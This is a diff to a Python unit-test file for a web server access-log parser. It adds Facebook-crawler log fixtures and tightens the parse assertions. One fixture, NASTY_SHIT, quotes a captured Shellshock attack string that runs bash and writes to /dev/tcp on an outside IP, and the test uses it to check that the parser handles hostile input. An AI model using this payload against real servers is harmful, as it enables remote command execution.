@@ -20,12 +20,24 @@ import parse
 ip1 = "221.127.9.141"
 ip2 = "82.132.214.244"
 
+OLD_STYLE = """
+2015-02-20 05:57:24+0000 [HTTPChannel,1102,173.252.120.113] 173.252.120.113 tellectual.com - [20/Feb/2015:05:57:23 +0000] "GET /ME-640px.jpg HTTP/1.1" 200 756204 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
+"""
+
+NEW_STYLE = """
+2015-06-28 08:13:39+0000 [-] 173.252.74.112 edsuom.com - [28/Jun/2015:08:13:39 +0000] "GET /pics/Sacrifice_of_Isaac-Caravaggio-640px.jpg HTTP/1.1" 200 161670 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
+"""
+
 NASTY_SHIT = """
 2015-02-26 20:00:24+0000 [HTTPChannel,3229,68.116.30.102] 68.116.30.102 EVOLVINGOUTOFEDEN.ORG - [26/Feb/2015:20:00:24 +0000] "GET /cgi-bin/test-cgi HTTP/1.1" 302 234 "() { :;}; /bin/bash -c \"echo EVOLVINGOUTOFEDEN.ORG/cgi-bin/test-cgi > /dev/tcp/23.227.199.185/80; echo EVOLVINGOUTOFEDEN.ORG/cgi-bin/test-cgi > /dev/udp/23.227.199.185/80\"" "() { :;}; /bin/bash -c \"echo EVOLVINGOUTOFEDEN.ORG/cgi-bin/test-cgi > /dev/tcp/23.227.199.185/80; echo EVOLVINGOUTOFEDEN.ORG/cgi-bin/test-cgi > /dev/udp/23.227.199.185/80\"
-""".strip()
+"""
 
 TWISTED_MSG = """
 2015-04-02 20:07:41+0000 [HTTPChannel,28192,216.99.158.78] Warning: HEAD request <HEAD /fckeditor/editor HTTP/1.1> for resource <twisted.web.resource.NoResource instance at 0x146fe18> is returning a message body.  I think I'll eat it.
+"""
+
+ANOTHER_TWISTED_MSG = """
+2015-02-18 03:21:45+0000 [-] Starting factory <twisted.web.server.Site instance at 0x28408c0>
 """
 
 
@@ -62,7 +74,7 @@ class TestParser(TestCase):
         for text, dtExpected in textExpected:
             self.failUnlessEqual(self.p.parseDatetimeBlock(text), dtExpected)
             
-    def test_calle(self):
+    def test_call(self):
         textExpected = (
             ('64.233.172.98 freedomtodoubt.com - [07/Sep/2014:06:46:34 -0400] '+\
              '"GET /ftd.css HTTP/1.1" 200 1238 "http://freedomtodoubt.com/" '+\
@@ -89,16 +101,38 @@ class TestParser(TestCase):
               "test-cgi > /dev/udp/23.227.199.185/80\"",
               "() { :;}; /bin/bash -c \"echo EVOLVINGOUTOFEDEN.ORG/cgi-bin/test-cgi "+\
               "> /dev/tcp/23.227.199.185/80; echo EVOLVINGOUTOFEDEN.ORG/cgi-bin/"+\
-              "test-cgi > /dev/udp/23.227.199.185/80"])
+              "test-cgi > /dev/udp/23.227.199.185/80"]),
+            (OLD_STYLE,
+             ["tellectual.com",
+              "173.252.120.113",
+              dt(2015, 2, 20, 5, 57, 24),
+              "/ME-640px.jpg",
+              200,
+              "-",
+              "facebookexternalhit/1.1 "+\
+              "(+http://www.facebook.com/externalhit_uatext.php)"]),
+            (NEW_STYLE,
+             ["edsuom.com",
+              "173.252.74.112",
+              dt(2015, 6, 28, 8, 13, 39),
+              "/pics/Sacrifice_of_Isaac-Caravaggio-640px.jpg",
+              200,
+              "-",
+              "facebookexternalhit/1.1 "+\
+              "(+http://www.facebook.com/externalhit_uatext.php)"]),
         )
         for text, expected in textExpected:
-            self.assertItemsEqual(self.p(text), expected)
+            text = text.strip()
+            result = self.p(text)
+            self.assertNotNone(result, "Did not parse '{}'".format(text))
+            self.assertItemsEqual(result, expected)
 
     def test_call_nastyShit(self):
         for k in xrange(3):
-            dtp = self.p(NASTY_SHIT)[2]
+            dtp = self.p(NASTY_SHIT.strip())[2]
             self.assertEqual(dtp, dt(2015, 02, 26, 20, 0, 24))
 
     def test_call_bogus(self):
         self.assertNone(self.p("xxxx"))
-        self.assertNone(self.p(TWISTED_MSG))
+        self.assertNone(self.p(TWISTED_MSG.strip()))
+        self.assertNone(self.p(ANOTHER_TWISTED_MSG.strip()))
